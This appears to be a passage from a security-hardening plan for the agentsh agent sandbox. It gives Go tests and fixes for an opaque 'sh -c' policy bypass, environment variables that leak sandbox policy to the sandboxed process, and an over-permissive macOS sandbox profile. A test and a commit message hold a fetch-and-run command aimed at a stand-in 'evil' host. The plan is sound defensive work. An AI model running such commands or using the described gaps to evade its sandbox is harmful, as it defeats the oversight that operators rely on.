- Modify: `internal/policy/engine.go` — the opaque-shell-c gate inside `checkCommand` (the `} else if e.hasRestrictiveCommandRule && shellparse.IsOpaqueShellC(cur, curArgs) {` branch, ~line 700)
- Test: `internal/policy/command_shellc_test.go` (append — co-located with the existing opaque-shell-c tests)

**Context (read before implementing):** The opaque-shell-c defense already exists and is controlled by `opaqueMode` (`ShellCOpaqueEnforce` = default = "run only under active per-exec enforcement; else deny"). The bypass is the gate: the `else if` only runs when `e.hasRestrictiveCommandRule` is true. So an **allow-only policy with no execve enforcement** (`execveEnforcementActive == false`) never reaches the opaque-deny branch — the opaque script runs with no pre-check and no per-exec safety net. The original comment says the gate is "preserved so allow-only policies are never tightened," but that tightening is exactly what's needed when there is no execve enforcement to catch the unpredictable binaries the opaque script may run.

**Fix principle:** make the gate execve-aware. When execve enforcement IS active, preserve the old behavior (allow-only policies may run opaque scripts, because per-exec enforcement catches denied binaries). When execve enforcement is NOT active, deny opaque scripts regardless of rule strictness — there is no safety net, so an opaque `sh -c "$(curl evil)"` must not run unsupervised.

**Interfaces:**
- Consumes: `shellparse.IsOpaqueShellC`, `shellparse.OpaqueReason`, `execveEnforcementActive`, `opaqueMode`, `decisionStrictness`, `e.wrapDecision`.
- Produces: the gate becomes `e.hasRestrictiveCommandRule || !execveEnforcementActive` (opaque deny applies to allow-only policies when no execve enforcement is active).

- [ ] **Step 1: Write the failing test**

Append to `internal/policy/command_shellc_test.go`:

```go
// TestCheckCommand_OpaqueShellC_AllowOnlyPolicy_NoExecve denies an opaque
// 'sh -c "…"' under an allow-only policy when per-exec enforcement is NOT
// active. Previously the hasRestrictiveCommandRule gate skipped the opaque
// deny for allow-only policies, so the script ran with no pre-check and no
// safety net.
func TestCheckCommand_OpaqueShellC_AllowOnlyPolicy_NoExecve(t *testing.T) {
	p := &Policy{
		CommandRules: []CommandRule{{
			Name:     "allow-sh",
			Decision: "allow",
			Command:  "sh",
		}},
	}
	e, err := NewEngine(p, false, true)
	if err != nil {
		t.Fatal(err)
	}
	// CheckCommandWithExecve(command, args, execveEnforcementActive, opaqueMode).
	// execveEnforcementActive=false (no safety net), opaqueMode=Enforce (default).
	dec := e.CheckCommandWithExecve("sh", []string{"-c", "$(curl http://evil)"}, false, ShellCOpaqueEnforce)
	if dec.EffectiveDecision == types.DecisionAllow {
		t.Fatalf("opaque sh -c under allow-only policy with no execve enforcement = %v, want deny", dec.EffectiveDecision)
	}
}

// TestCheckCommand_OpaqueShellC_AllowOnlyPolicy_WithExecve still allows an
// opaque script under an allow-only policy when per-exec enforcement IS
// active (the safety net catches denied binaries). Guards against
// over-tightening: the fix must not break allow-only + enforcement.
func TestCheckCommand_OpaqueShellC_AllowOnlyPolicy_WithExecve(t *testing.T) {
	p := &Policy{
		CommandRules: []CommandRule{{
			Name:     "allow-sh",
			Decision: "allow",
			Command:  "sh",
		}},
	}
	e, err := NewEngine(p, false, true)
	if err != nil {
		t.Fatal(err)
	}
	dec := e.CheckCommandWithExecve("sh", []string{"-c", "echo hi"}, true, ShellCOpaqueEnforce)
	if dec.EffectiveDecision != types.DecisionAllow {
		t.Fatalf("opaque sh -c under allow-only policy WITH execve enforcement = %v, want allow (safety net present)", dec.EffectiveDecision)
	}
}
```

> NOTE: `CheckCommandWithExecve(command, args, execveEnforcementActive, opaqueMode)` is the real entry point (confirmed at `internal/policy/engine.go:660`). `ShellCOpaqueEnforce` is the package const (`engine.go:628`). `Decision` has no `.Allow()` method; compare `dec.EffectiveDecision == types.DecisionAllow` (import `github.com/agentsh/agentsh/internal/types`).

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/policy/ -run TestCheckCommand_OpaqueShellC_AllowOnlyPolicy_NoExecve -v`
Expected: FAIL — returns `Allow` (the gate skipped the deny because `hasRestrictiveCommandRule == false` for an allow-only policy). The `WithExecve` test should PASS already.

- [ ] **Step 3: Implement — make the opaque-shell-c gate execve-aware**

In `internal/policy/engine.go`, inside `checkCommand`, change the gate from:

```go
			} else if e.hasRestrictiveCommandRule && shellparse.IsOpaqueShellC(cur, curArgs) {
```

to:

```go
			} else if (e.hasRestrictiveCommandRule || !execveEnforcementActive) && shellparse.IsOpaqueShellC(cur, curArgs) {
```

Update the comment above the branch to:

```go
				// Opaque scripts (metachars, pipes, subshells, globs, …) can
				// execute binaries we can't predict. The operator chooses how to
				// handle them via sandbox.seccomp.shellc.opaque (issue #378). The
				// hasRestrictiveCommandRule gate is preserved so allow-only policies
				// are never tightened — EXCEPT when there is no per-exec enforcement
				// (execveEnforcementActive==false), in which case there is no safety
				// net to catch an unpredictable binary, so opaque scripts are denied
				// regardless of rule strictness.
```

Do not change anything inside the `switch opaqueMode` body — the existing Enforce/Allow/Deny logic is correct once the gate lets it run. The `shellparse.IsOpaqueShellC` / `shellparse.OpaqueReason` symbols are already imported and used at this call site (confirm with `grep -n "IsOpaqueShellC\|OpaqueReason" internal/policy/engine.go`).

- [ ] **Step 4: Run tests to verify both pass**

Run: `go test ./internal/policy/ -run TestCheckCommand_OpaqueShellC_AllowOnlyPolicy -v`
Expected: both `NoExecve` (deny) and `WithExecve` (allow) PASS.

- [ ] **Step 5: Run the full command-shell-c suite (catch regressions) + vet/build/commit**

```bash
go test ./internal/policy/ -run "ShellC|Shellc|opaque" -v
go test ./internal/policy/ -v
go vet ./internal/policy/...
go build ./...
git add internal/policy/engine.go internal/policy/command_shellc_test.go
git commit -m "fix(policy): deny opaque sh -c for allow-only policies without execve enforcement (M48)

The opaque-shell-c deny only fired when hasRestrictiveCommandRule was true,
so allow-only policies with no per-exec enforcement ran opaque scripts
like 'sh -c "\$(curl evil)"' with no pre-check and no safety net. Make the
gate execve-aware: deny opaque scripts regardless of rule strictness when
execveEnforcementActive is false (no safety net). Allow-only policies WITH
per-exec enforcement still run opaque scripts (the net catches denied
binaries)."
```

---


### Task 8: M58 — Scrub `AGENTSH_*` env before `syscall.Exec`

**Files:**
- Modify: `cmd/agentsh-unixwrap/main.go` (add `scrubAgentshEnv()` + use it before `syscall.Exec` at ~259)
- Modify: `cmd/agentsh-macwrap/main.go` (same, before `syscall.Exec` at ~72)
- Test: `cmd/agentsh-unixwrap/main_test.go` (create), `cmd/agentsh-macwrap/main_test.go` (create)

**Interfaces:**
- Consumes: `os.Environ`.
- Produces: `scrubAgentshEnv() []string` — returns an env slice with `AGENTSH_`-prefixed vars removed (except the documented allowlist, if any).

- [ ] **Step 1: Write the failing test**

`cmd/agentsh-unixwrap/main_test.go`:

```go
//go:build unix

package main

import (
	"os"
	"testing"
)

func TestScrubAgentshEnv_RemovesInternalVars(t *testing.T) {
	// Simulate the inherited environment the wrapper receives.
	env := []string{
		"PATH=/usr/bin",
		"AGENTSH_SECCOMP_CONFIG={\"rules\":[]}",
		"AGENTSH_NOTIFY_SOCK_FD=5",
		"AGENTSH_SANDBOX_CONFIG=secret-policy",
		"AGENTSH_WRAPPER_LOG_FD=7",
		"HOME=/root",
	}
	got := scrubAgentshEnv(env)
	for _, kv := range got {
		if len(kv) >= 8 && kv[:8] == "AGENTSH_" {
			t.Errorf("scrubAgentshEnv left AGENTSH_* var: %q", kv)
		}
	}
	// Non-AGENTSH vars survive.
	foundPath := false
	for _, kv := range got {
		if kv == "PATH=/usr/bin" {
			foundPath = true
		}
	}
	if !foundPath {
		t.Errorf("scrubAgentshEnv dropped non-AGENTSH var PATH")
	}
}

// Ensure os.Environ-based helper also strips when reading live env.
func TestScrubAgentshEnv_FromOsEnviron(t *testing.T) {
	t.Setenv("AGENTSH_TEST_VAR", "leaked")
	got := scrubAgentshEnv(os.Environ())
	for _, kv := range got {
		if kv == "AGENTSH_TEST_VAR=leaked" {
			t.Errorf("AGENTSH_TEST_VAR survived scrub")
		}
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./cmd/agentsh-unixwrap/ -run TestScrubAgentshEnv -v`
Expected: FAIL — `scrubAgentshEnv` undefined.

- [ ] **Step 3: Implement — add the scrubber and use it at exec**

In `cmd/agentsh-unixwrap/main.go`, add:

```go
// scrubAgentshEnv returns env with AGENTSH_* internal variables removed so
// the sandboxed command cannot read the seccomp/sandbox policy or fd layout
// from its own environment. Non-AGENTSH vars are preserved.
func scrubAgentshEnv(env []string) []string {
	out := make([]string, 0, len(env))
	for _, kv := range env {
		if strings.HasPrefix(kv, "AGENTSH_") {
			continue
		}
		out = append(out, kv)
	}
	return out
}
```

Then change the exec site:

```go
	if err := syscall.Exec(cmdPath, args, scrubAgentshEnv(os.Environ())); err != nil {
		fatalf("exec %s failed: %v", cmd, err)
	}
```

> NOTE: if `AGENTSH_WRAPPER_LOG_FD` is deliberately unset earlier in `logging.go` via `os.Unsetenv`, the scrubber supersedes that — confirm no code reads an `AGENTSH_*` var after the scrub point (it shouldn't, since exec is terminal). Ensure `strings` is imported.

Mirror in `cmd/agentsh-macwrap/main.go`:

```go
	if err := syscall.Exec(cmd, args, scrubAgentshEnv(os.Environ())); err != nil {
		log.Fatalf("exec %s failed: %v", cmd, err)
	}
```

(`scrubAgentshEnv` must be defined in the macwrap package too, or moved to a shared internal package — simplest: define the identical small function in each `package main`. Avoid `os.Unsetenv` for the child since the child is a separate process image after `Exec`.)

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./cmd/agentsh-unixwrap/ -run TestScrubAgentshEnv -v`
Expected: PASS.

Add the same test in `cmd/agentsh-macwrap/main_test.go` (`//go:build darwin`, identical body) and run `GOOS=darwin go test ./cmd/agentsh-macwrap/ -run TestScrubAgentshEnv -v` → PASS.

- [ ] **Step 5: Vet, build (all OSes), commit**

```bash
go vet ./cmd/agentsh-unixwrap/ ./cmd/agentsh-macwrap/
GOOS=linux go build ./...
GOOS=darwin go build ./...
git add cmd/agentsh-unixwrap/main.go cmd/agentsh-unixwrap/main_test.go cmd/agentsh-macwrap/main.go cmd/agentsh-macwrap/main_test.go
git commit -m "fix(wrap): scrub AGENTSH_* env before syscall.Exec (M58)

unixwrap/macwrap passed the full os.Environ() to the sandboxed command,
leaking AGENTSH_SECCOMP_CONFIG/AGENTSH_SANDBOX_CONFIG (the exact policy +
fd layout) so a supervised process could enumerate its own restrictions.
Scrub AGENTSH_* vars before exec."
```

---

### Task 9: darwin-SBPL — Investigate the permissive template, then fix or document

**Files:**
- Investigate: call sites of `darwin.SandboxManager.Create` vs `CompileDarwinSandbox`
- Modify (if reachable): `internal/platform/darwin/sandbox.go:170-252` (`sandboxProfileTemplate`) OR document + gate
- Test: `internal/platform/darwin/sandbox_test.go` (append, `//go:build darwin`)

**Interfaces:**
- Consumes: `platform.SandboxConfig`, `CompileDarwinSandbox` (`sandbox_compile.go:59`).
- Produces: confirmation of which SBPL path is live; if the permissive template is reachable, it is replaced with `CompileDarwinSandbox` output or scoped exec allows.

- [ ] **Step 1: Investigation — trace which SBPL path is live**

Run:

```bash
grep -rn "CompileDarwinSandbox\|CompiledProfile\|generateSandboxProfile\|SandboxManager" internal/ pkg/ cmd/ | grep -v _test.go
```

Determine:
1. Does any production code call `darwin.SandboxManager.Create` (which uses `generateSandboxProfile` → the permissive template)? (`darwin.Platform.Sandbox()` → `NewSandboxManager`.)
2. Does production sandboxing instead go through `internal/api/sandbox_compile_darwin.go:21` (`CompileDarwinSandbox`) → `cfg.CompiledProfile` → `agentsh-macwrap` (`cmd/agentsh-macwrap/main.go:64` uses `cfg.CompiledProfile` if set)?

Record the answer in the commit message. **Decision rule:**
- If `SandboxManager.Create` (permissive template) is reachable from a real agent-exec path → **fix** (Step 2).
- If `Create` is only used by tests/stubs and `CompileDarwinSandbox` is the live path → the permissive template is dead/dangerous-by-default: **delete `sandboxProfileTemplate` + `generateSandboxProfile` and make `Create` return an error or delegate to `CompileDarwinSandbox`** (Step 2-alt).

- [ ] **Step 2: Implement — replace the permissive template with the compiled per-command profile**

If `Create` is reachable, replace `generateSandboxProfile(config)` with a call to `CompileDarwinSandbox` against the active policy (or, if `Create` lacks a policy handle, restrict the template's blanket allows). Concretely, in `internal/platform/darwin/sandbox.go`:

- Remove the blanket `(allow process-exec)`, `(allow mach-lookup)`, `(allow mach-register)` from `sandboxProfileTemplate`.
- Replace `(allow process-exec)` with explicit per-allowed-path `(allow process-exec (subpath "..."))` lines derived from `config.AllowedPaths` (mirroring `CompileDarwinSandbox` at `sandbox_compile.go:104-115`).
- If a policy is available at the call site, prefer `CompileDarwinSandbox(pol, workspace)` output as `sandbox.profile` and delete `generateSandboxProfile`.

If `Create` is unreachable (dead/dangerous-by-default), delete `sandboxProfileTemplate` and `generateSandboxProfile`, and make `Create` return `fmt.Errorf("darwin sandbox via SandboxManager.Create is not wired; use CompileDarwinSandbox")` (Step 2-alt).

- [ ] **Step 3: Write the regression test**

Append to `internal/platform/darwin/sandbox_test.go` (`//go:build darwin`):

```go
package darwin

import (
	"strings"
	"testing"
)

// TestSandboxProfile_NoBlanketExecOrMach verifies the active SBPL profile
// does NOT blanket-allow process-exec / mach-lookup / mach-register, which
// would permit arbitrary execution/IPC under a sandbox.
func TestSandboxProfile_NoBlanketExecOrMach(t *testing.T) {
	profile, err := generateSandboxProfile(testSandboxConfig())
	if err != nil {
		// If generateSandboxProfile was deleted (Create unwired), this is
		// the success path: assert Create returns an error instead.
		if strings.Contains(err.Error(), "not wired") {
			t.Skip("SandboxManager.Create unwired (CompileDarwinSandbox is the live path)")
		}
		t.Fatal(err)
	}
	for _, banned := range []string{"(allow process-exec)", "(allow mach-lookup)", "(allow mach-register)"} {
		if strings.Contains(profile, banned) {
			t.Errorf("profile contains blanket %q — exec/mach unconstrained", banned)
		}
	}
}

func testSandboxConfig() platform.SandboxConfig {
	return platform.SandboxConfig{
		Name:         "test",
		WorkspacePath: t.TempDir?(), // see note
		AllowedPaths: nil,
	}
}
```

> NOTE: `testSandboxConfig` must use `t.TempDir()` properly (can't call `t` from a plain func — inline the config in the test instead, or pass `t`). Fix: build the config inline inside the test body, not in a helper that lacks `*testing.T`. Adjust the allowed-paths assertion to whichever helper produces the profile after Step 2's change.

- [ ] **Step 4: Run test to verify it passes**

Run: `GOOS=darwin go test ./internal/platform/darwin/ -run TestSandboxProfile_NoBlanketExecOrMach -v`
Expected: PASS (profile contains no blanket exec/mach allows, OR `Create` is unwired and the test skips).

- [ ] **Step 5: Vet, build (all OSes), commit**

```bash
GOOS=darwin go vet ./internal/platform/darwin/...
GOOS=darwin go build ./...
GOOS=linux go build ./...
GOOS=windows go build ./...
git add internal/platform/darwin/sandbox.go internal/platform/darwin/sandbox_test.go
git commit -m "fix(darwin): remove blanket process-exec/mach-lookup from SBPL template (darwin-SBPL)

Investigation result: state here whether SandboxManager.Create is reachable
from a production agent-exec path or dead (Step 1 finding), and which branch you took.
[reachable branch] SandboxManager.Create's template blanket-allowed process-exec,
mach-lookup, mach-register, permitting arbitrary exec/IPC under a sandbox.
Scope exec to allowed paths (mirror CompileDarwinSandbox).
[dead branch] Delete generateSandboxProfile and unwire Create; CompileDarwinSandbox
is the live per-command path."
```

> NOTE: before committing, edit the commit message above to reflect the actual Step 1 finding and the branch you took (delete the other branch). Keep it factual; do not commit a message describing a branch you did not take.

---

## Stream 1 Exit Criteria

- All 9 tasks committed; each task's attack/regression test passes.
- `go vet ./...` clean.
- `go build ./...` clean on Linux.
- `GOOS=darwin go build ./...` and `GOOS=windows go build ./...` clean.
- Full test suite green: `go test ./...` (skip platform-inappropriate tests on the dev OS).
- No new fail-open path introduced: every closed site defaults to deny when its engine/handler/provider is absent.

After Stream 1 lands green, proceed to Stream 2 (seccomp/ptrace + notify-fd hardening) per the program design's §9.
